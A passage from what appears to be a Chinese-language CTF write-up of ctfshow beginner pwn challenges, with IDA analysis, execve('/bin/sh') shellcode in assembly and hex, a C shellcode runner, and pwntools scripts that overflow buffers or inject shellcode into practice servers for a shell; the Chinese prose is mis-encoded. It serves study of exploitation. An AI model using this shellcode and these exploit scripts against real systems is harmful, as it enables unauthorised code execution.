</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="k">global</span> <span class="nv">_start</span>
</span></span><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.text</span>
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="mi">59</span>
</span></span><span class="line"><span class="cl"> <span class="nf">pop</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"> <span class="nf">cdq</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"> <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span><span class="mh">0x68732f6e69622f2f</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rbx</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rsp</span>
</span></span><span class="line"><span class="cl"> <span class="nf">pop</span> <span class="nb">rdi</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rdi</span>
</span></span><span class="line"><span class="cl"> <span class="nf">push</span> <span class="nb">rsp</span>
</span></span><span class="line"><span class="cl"> <span class="nf">pop</span> <span class="nb">rsi</span>
</span></span><span class="line"><span class="cl"> <span class="nf">syscall</span>       
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// char code[] = &#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;len:%d bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">   <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">code</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>          
</span></span></code></pre></td></tr></table>
</div>
</div></blockquote></blockquote>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28310</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">buf_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode_x64</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#https://www.exploit-db.com/shellcodes/43550</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_address</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode_x64</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_063">PWN_063
</h3><p>é¢˜ç›®ï¼šåˆçŸ­äº†ä¸€ç‚¹ã€‚</p>
<p>checksecï¼Œä¸å¤šè¯´ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213.png"
	width="750"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213_hu_37ebbc241cc091a6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213_hu_3ce05ff41c169de6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="782px"
	
></p>
<p>IDA64ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214.png"
	width="683"
	height="320"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214_hu_d91ab9a7582c983b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214_hu_9fd2b425b225cc2b.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="213"
		data-flex-basis="512px"
	
></p>
<p>è¿™æ¬¡æ›´ç‹ äº†ï¼Œreadåªè¯»å–55é•¿åº¦äº†&hellip;</p>
<p>è¿˜æ˜¯è¿™ä¸ªç½‘ç«™ï¼Œæ‰¾ä¸€ä¸ª23å­—èŠ‚çš„shellcodeğŸ˜„ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28183</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">buf_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode_x64</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#https://www.exploit-db.com/exploits/36858</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_address</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode_x64</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å»ºè®®å¯ä»¥æŠŠä¸€äº›é•¿åº¦è¾ƒçŸ­çš„shellcodeä¿å­˜åˆ°æ¡Œé¢ï¼Œä¸‹æ¬¡é‡åˆ°æ–­ç½‘çš„çº¿ä¸‹èµ›å°±å¯ä»¥ç›´æ¥å¥—ç”¨äº†ã€‚</p>
<h3 id="pwn_064">PWN_064
</h3><p>é¢˜ç›®ï¼šæœ‰æ—¶å€™å¼€å¯æŸç§ä¿æŠ¤å¹¶ä¸ä»£è¡¨è¿™æ¡è·¯ä¸é€šã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215.png"
	width="820"
	height="201"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215_hu_85ff8b3cf65352ea.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215_hu_aae5ea8ee9e2b917.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="407"
		data-flex-basis="979px"
	
></p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216.png"
	width="640"
	height="350"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216_hu_13386c853c3b0f6d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216_hu_dac7daa91c634eb8.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="438px"
	
></p>
<p>çœ‹åˆ°ä¸€ä¸ªæ–°å‡½æ•°mmapï¼Œ<code>mmap</code>ï¼ˆmemory mapï¼‰æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨ï¼Œä¸»è¦åŠŸèƒ½æ˜¯<strong>å°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´</strong>ï¼Œä½†åœ¨ PWN æ¼æ´åˆ©ç”¨ä¸­ï¼Œæ›´å¸¸ç”¨å…¶ â€œåŒ¿åæ˜ å°„â€ åŠŸèƒ½ï¼Œå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼ˆ<code>rdi, rsi, rdx, r10, r8, r9</code>ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attributes: thunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">address</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">__off_t</span> <span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">prot</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<ol>
<li><strong><code>address</code>ï¼ˆrdi å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>æœŸæœ›çš„å†…å­˜èµ·å§‹åœ°å€ï¼Œé€šå¸¸è®¾ä¸º<code>0</code>ï¼ˆè®©ç³»ç»Ÿè‡ªåŠ¨åˆ†é…ï¼‰ã€‚</p>
<ol start="2">
<li><strong><code>length</code>ï¼ˆrsi å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆå­—èŠ‚ï¼‰ï¼Œéœ€æ ¹æ® shellcode é•¿åº¦è®¾ç½®ï¼ˆå¦‚æ–‡æ¡£ä¸­è®¾ä¸º<code>0x1000</code>ï¼Œå³ 4KBï¼Œè¶³å¤Ÿå­˜æ”¾ ORW shellcodeï¼‰ã€‚</p>
<ol start="3">
<li><strong><code>prot</code>ï¼ˆrdx å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>å†…å­˜ä¿æŠ¤å±æ€§ï¼ŒPWN ä¸­å¸¸ç”¨<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>ï¼ˆå¯¹åº”å€¼<code>0x7</code>ï¼‰ï¼Œè¡¨ç¤ºå†…å­˜å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚</p>
<ol start="4">
<li><strong><code>flags</code>ï¼ˆr10 å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>æ˜ å°„ç±»å‹æ ‡å¿—ï¼Œæ¼æ´åˆ©ç”¨ä¸­å¸¸ç”¨<code>MAP_ANONYMOUS | MAP_PRIVATE</code>ï¼ˆå¯¹åº”å€¼<code>0x22</code>ï¼‰ï¼š</p>
<ul>
<li><code>MAP_ANONYMOUS</code>ï¼šåŒ¿åæ˜ å°„ï¼Œä¸å…³è”æ–‡ä»¶ï¼›</li>
<li><code>MAP_PRIVATE</code>ï¼šç§æœ‰æ˜ å°„ï¼Œä¿®æ”¹ä¸å½±å“å…¶ä»–è¿›ç¨‹ã€‚</li>
</ul>
<ol start="5">
<li><strong><code>fd</code>ï¼ˆr8 å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>æ–‡ä»¶æè¿°ç¬¦ï¼ŒåŒ¿åæ˜ å°„æ—¶è®¾ä¸º<code>-1</code>ï¼ˆæˆ–<code>0</code>ï¼Œä¸å½±å“ï¼‰ã€‚</p>
<ol start="6">
<li><strong><code>offset</code>ï¼ˆr9 å¯„å­˜å™¨ï¼‰</strong>ï¼š</li>
</ol>
<p>æ–‡ä»¶åç§»é‡ï¼ŒåŒ¿åæ˜ å°„æ—¶è®¾ä¸º<code>0</code>ã€‚</p>
</blockquote>
<p>è¿™è¡Œä»£ç ä½¿ç”¨ mmap å‡½æ•°åˆ†é…ä¸€å—å†…å­˜åŒºåŸŸï¼Œå°†å…¶èµ·å§‹åœ°å€ä¿å­˜åœ¨å˜é‡ buf ä¸­ã€‚ mmap å‡½æ•°é€šå¸¸ç”¨äºåœ¨å†…å­˜ä¸­åˆ†é…ä¸€å—è¿ç»­çš„åœ°å€ç©ºé—´ï¼Œå¹¶æŒ‡å®šç›¸åº”çš„æƒé™å’Œå±æ€§ã€‚</p>
<p>è¿™é‡Œbufç”¨mmapæ˜ å°„äº†åœ°å€ï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç›´æ¥ä¼ å…¥shellcodeï¼Œ((void (*)(void))buf)()ã€‚è°ƒç”¨äº†bufï¼Œè¿è¡Œshellcode å³å¯è·å–shellã€‚</p>
<p>é‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥ç”¨pwntoolsçš„shellcraftæ¨¡å—ä¸‹çš„shellcodeï¼ˆ29å­—èŠ‚é•¿åº¦ï¼‰</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28163</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_065">PWN_065
</h3><p>é¢˜ç›®ï¼šä½ æ˜¯ä¸€ä¸ªå¥½äººã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217.png"
	width="689"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217_hu_9219bd1807e776b6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217_hu_4a3ba2071de4bd87.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="718px"
	
></p>
<p>å±…ç„¶å¼€äº†RELROå®Œå…¨ä¿æŠ¤ã€‚</p>
<p>è¿è¡Œä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219.png"
	width="800"
	height="130"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219_hu_7cb2704aaaf5c087.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219_hu_f3f9891fe0470510.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="615"
		data-flex-basis="1476px"
	
></p>
<p>å¯ä»¥å‘ç°è¿™é‡Œè¦æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²æ‰è¡Œã€‚</p>
<p>IDA64çœ‹ä¸äº†æºç ï¼Œåªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220.png"
	width="854"
	height="143"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220_hu_5fd5faaaffbfe84b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220_hu_b8c536d0801b1752.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="597"
		data-flex-basis="1433px"
	
></p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ç»readå‡½æ•°è¯»å–ç„¶åé€šè¿‡jgæ¯”è¾ƒæ˜¯var_8å¦å¤§äºé›¶ï¼Œç¬¦åˆè¦æ±‚å°±è·³è½¬åˆ°<strong>loc_11AC</strong></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221.png"
	width="905"
	height="384"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221_hu_fd3b4f7c452cd320.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221_hu_91c3e0d533f16fc6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<blockquote>
<p><code>cdqe</code>ä½¿ç”¨eaxçš„æœ€é«˜ä½æ‹“å±•raxé«˜32ä½çš„æ‰€æœ‰ä½ movzxåˆ™æ˜¯æŒ‰æ— ç¬¦å·æ•°ä¼ é€+æ‰©å±•ï¼ˆ16-32ï¼‰ EAXæ˜¯32ä½çš„å¯„å­˜å™¨ï¼Œè€ŒAXæ˜¯EAXçš„ä½16ä½,AHæ˜¯axçš„é«˜8ä½ï¼Œè€ŒALæ˜¯axçš„ä½8ä½å¤§è‡´å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ¯ä¸€ä½è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åœ¨<code>0x60~0x7A</code>è¿™ä¸ªèŒƒå›´å°±è·³è½¬å‰©ä¸‹å‡ ä¸ªå°±æ˜¯è·³è½¬çš„èŒƒå›´ã€‚</p>
<p>æ„æ€å¯èƒ½å°±æ˜¯ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹ä¸€ç›´åšå¾ªç¯åˆ¤æ–­ï¼Œå¦‚æœæ¯ä¸€ä¸ªå­—ç¬¦éƒ½åœ¨ä¸€å®šåŒºé—´ï¼Œç»“æŸæœ€åä¸€ä¸ªå­—ç¬¦åˆ¤æ–­æ—¶å°±èƒ½å¤Ÿç»•è¿‡ä¸Šé¢çš„ loc_11B8 æ¥æ‰§è¡Œ shellcode äº†ã€‚</p>
</blockquote>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222.png"
	width="1025"
	height="859"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222_hu_e5c0df3aa0131082.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222_hu_fbda44b5fa3129b9.png 1024w"
	loading="lazy"
	
		alt="å­—ç¬¦èŒƒå›´ç¡®å®š"
	
	
		class="gallery-image" 
		data-flex-grow="119"
		data-flex-basis="286px"
	
></p>
<p>1.ç¬¬ä¸€ç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ <code>0x60~0x7A</code>ï¼ˆå¯¹åº” ASCII &lsquo;`&rsquo;~&lsquo;z&rsquo;ï¼‰</p>
<p>å¯¹åº”ä»£ç æ®µï¼ˆ<code>loc_11B8</code>è‡³<code>loc_1236</code>ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">C5</span>                 <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">60h</span> <span class="c1">; &#39;`&#39;  // è¾¹ç•Œ1ï¼š0x60</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">C7</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_11DA</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x60</span> <span class="err">â†’</span> <span class="err">è¿›å…¥ä¸‹ä¸€è½®æ ¡éªŒ</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">D6</span>                 <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">7Ah</span> <span class="c1">; &#39;z&#39;  // è¾¹ç•Œ2ï¼š0x7A</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">D8</span>                 <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">loc_1236</span>  <span class="o">//</span> <span class="err">å­—ç¬¦â‰¤</span><span class="mh">0x7A</span> <span class="err">â†’</span> <span class="err">é€šè¿‡æ ¡éªŒ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.ç¬¬äºŒç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ <code>0x40~0x5A</code>ï¼ˆå¯¹åº” ASCII &lsquo;@&rsquo;~&lsquo;Z&rsquo;ï¼‰</p>
<p>å¯¹åº”ä»£ç æ®µï¼ˆ<code>loc_11DA</code>è‡³<code>loc_1236</code>ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000000000011</span><span class="nf">E7</span>                 <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">40h</span> <span class="c1">; &#39;@&#39;  // è¾¹ç•Œ1ï¼š0x40</span>
